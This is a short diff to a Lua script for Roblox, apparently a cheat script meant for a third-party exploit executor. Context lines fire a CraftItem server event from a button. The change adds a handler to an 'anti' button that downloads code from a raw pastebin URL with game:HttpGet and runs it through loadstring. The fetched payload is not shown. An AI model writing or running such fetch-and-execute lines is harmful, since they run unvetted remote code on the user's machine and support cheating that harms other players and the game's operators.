@@ -464,3 +464,9 @@ craft.MouseButton1Down:connect(function()
 	local Event = game:GetService("ReplicatedStorage").Events.CraftItem
 	Event:FireServer(CI)
 end)
+
+anti.MouseButton1Down:connect(function() 
+	
+	loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
+	
+end)
